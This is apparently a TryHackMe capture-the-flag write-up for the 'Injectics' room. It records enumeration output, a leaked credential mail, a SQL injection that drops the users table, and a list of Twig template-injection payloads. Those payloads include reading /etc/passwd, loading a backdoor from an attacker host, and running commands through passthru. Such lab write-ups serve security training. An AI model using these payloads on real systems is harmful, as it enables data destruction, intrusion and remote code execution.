<code>
  
## Injectics

https://tryhackme.com/r/room/injectics

### Enumeration

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 06:01 EST
Nmap scan report for 10.10.136.219
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 df:14:5e:7b:3c:5d:14:1e:a2:fb:8e:16:69:e8:1d:b7 (RSA)
|   256 d8:a2:ad:30:00:60:82:f1:a0:d9:8e:b8:50:93:65:7c (ECDSA)
|_  256 0f:50:9b:b7:2a:46:2c:d3:be:bb:dd:41:ee:d6:79:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Injectics Leaderboard
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds


gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.136.219 -x php,txt,html                                            

[+] Url:                     http://10.10.136.219
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 6592]
/.php                 (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 5401]
/flags                (Status: 301) [Size: 314] [--> http://10.10.136.219/flags/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.136.219/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.136.219/js/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.136.219/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 315] [--> http://10.10.136.219/vendor/]
/dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
/functions.php        (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.136.219/phpmyadmin/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/conn.php             (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 278]



### in source code found notice about mail.log

http://10.10.136.219/mail.log

from: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm


┌──(kali㉿kali)-[~/Documents/THM/THM_Injectics]
└─$ sqlmap -r reg1.txt --level 5 --risk=3 --dump     
        ___
       __H__                                                                                                        
 ___ ___["]_____ ___ ___  {1.8.11#stable}                                                                           
|_ -| . [(]     | .'| . |                                                                                           
|___|_  [)]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

starting @ 09:15:11 /2025-01-16/

[09:15:11] [INFO] parsing HTTP request from 'reg1.txt'

[09:15:11] [INFO] resuming back-end DBMS 'mysql' 

[09:15:11] [INFO] testing connection to the target URL

sqlmap resumed the following injection point(s) from stored session:
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: username=10.10.9.71' RLIKE SLEEP(5)-- hcXN&password=10.10.9.71&function=login
---
[09:15:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[09:15:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[09:15:11] [INFO] fetching current database
[09:15:11] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[09:15:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[09:15:13] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[09:15:13] [INFO] fetching database names
[09:15:13] [INFO] fetching number of databases
[09:15:13] [INFO] retrieved: 
[09:15:13] [ERROR] unable to retrieve the number of databases
[09:15:13] [INFO] falling back to current database
[09:15:13] [INFO] fetching current database
[09:15:13] [INFO] retrieved: 
[09:15:14] [CRITICAL] unable to retrieve the database names
[09:15:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.9.71'


http://injectics.thm/composer.json
equire	
twig/twig	"2.14.0"

http://injectics.thm//phpmyadmin/doc/html/index.html
phpMyAdmin 4.9.5

To get access to the admin panel for the challenge question, I need to delete the ‘users’ table. So I want to find somewhere to inject:

**drop table users -- -**

So inject in dashboard

POST /edit_leaderboard.php HTTP/1.1
Host: injectics.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://injectics.thm/edit_leaderboard.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 208
Origin: http://injectics.thm
Connection: keep-alive
Cookie: PHPSESSID=04v8k348jddp0b0d76n46c16cu
Upgrade-Insecure-Requests: 1

rank=2&country=&gold=7; drop table users -- -&silver=0&bronze=7

Found that first name item in http://injectics.thm/update_profile.php is SSTI vulneable with twig/twig	"2.14.0"

{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{['id',""]|sort('passthru')}}
{{['ls -la ./flags',""]|sort('passthru')}}

  
<\code>
